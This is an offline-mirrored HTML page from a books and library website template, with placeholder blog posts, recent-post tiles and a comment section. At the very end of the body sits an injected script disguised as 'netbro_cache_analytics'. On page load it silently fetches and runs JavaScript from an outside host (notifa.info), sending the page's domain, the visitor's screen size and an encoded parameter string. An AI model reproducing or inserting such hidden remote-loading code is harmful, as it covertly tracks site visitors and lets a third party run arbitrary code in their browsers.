...
<!-- Mirrored from kodeforest.net/html/books/library/blog-detail.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 23 Dec 2018 05:13:19 GMT -->
<head>
<meta charset="utf-8">
                ...
                <!--LEFT CONTENT START--> 
                 <div class="col-md-9">
                    <!--BLOG LIST START-->
                     <div class="lib-blog-detail">
                        <!--BLOG THUMB START-->
                         <div class="kode-thumb">
                             <a href="#"><img src="images/blog-detail.png" alt=""></a>
                         </div>
                         <!--BLOG THUMB END-->
                         <!--BLOG TEXT START-->
                         <div class="detailed-text">
                            <div class="header">
                                <div class="kode-blog-date">
                                 ...
                                 <div class="kode-text">
                                    <h3>Books and Musings from Downunder</h3>
                                     <div class="kode-meta">
                                         <ul>
                                             <li><a href="#"><i class="fa fa-tag"></i>Marry Josaf</a></li>
                     ...
                     <!--BLOG LIST END-->
                     <div class="kode-recent-posts">
                     	<h2>Recent Posts</h2>
                        <div class="row">
                        	<div class="col-md-4 col-sm-4">
                            	<div class="recent-post-cover">
                                	<div class="kode-thumb">
                                    	<a href="#"><img src="images/recent-post.png" alt=""></a>
                                    </div>
                                    <div class="kode-text">
                                    	<h3>We Be Reading The Best Books</h3>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-4 col-sm-4">
                            	<div class="recent-post-cover">
                                	<div class="kode-thumb">
                                    	<a href="#"><img src="images/recent-post2.png" alt=""></a>
                                    </div>
                                    <div class="kode-text">
                                    	<h3>We Be Reading The Best Books</h3>
                                    </div>
                            ...
                            <div class="col-md-4 col-sm-4">
                            	<div class="recent-post-cover">
                                	<div class="kode-thumb">
                                    	<a href="#"><img src="images/recent-post3.png" alt=""></a>
                                    </div>
                                    <div class="kode-text">
                                    	<h3>We Be Reading The Best Books</h3>
                                    </div>
                     ...
                     <div class="kode-comments kode-comments-2">
                        ...
                        <ul>
                            <li>
                                ...
                                <div class="kode-text">
                                    <h4>Marry Josaf</h4>
                                    <p class="designation">JUNE 20, 2014</p>
...
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdy8hzAW7EupX6xYThriiVwhhJa%2fFoGiqbj%2fMfaO2nuZhUvu3v84C42TlA3%2fIl04gAQa0ykPsr2Dd7iE457%2fig4cwHhLHtn%2bhHAgm%2fhzzk9H8TT63e5rJsnzJuQs1XqcQrXsJTNFBJlEf7DqrI5Z2MrlAL6A9aOxEGpmhv6myoWZ27nOTKZXgR6yWD2PUNdDA%2bFo6pjM2KkW3Vn2You7zv7ghcuY2Am0UUTjORmEDgAP3pw%2bzldYwFYrxtbOoxobgG8bCH8dMa%2bEQGoh6L2xlQFface0ZCitcmq920u8lGSJkLJuH7sBM44Dju6zbA4orik2WktyC21oGGptdhGeNmIwa4YGSkh42oTJvx8I0jYJu4trdleC%2f7nwt4bq9kbKtizrXgvqJjwI7oVYNOJ1iP%2b%2bXmhqraHQG4UtB9fhuPtELjdxhvWccH9iovjcsfMSfgCCkVuHP7yxcfo2u%2bpdi%2ff%2fqAHyRhAR%2b61jZypfrpp0nURfhrrzItGg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from kodeforest.net/html/books/library/blog-detail.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 23 Dec 2018 05:13:45 GMT -->
</html>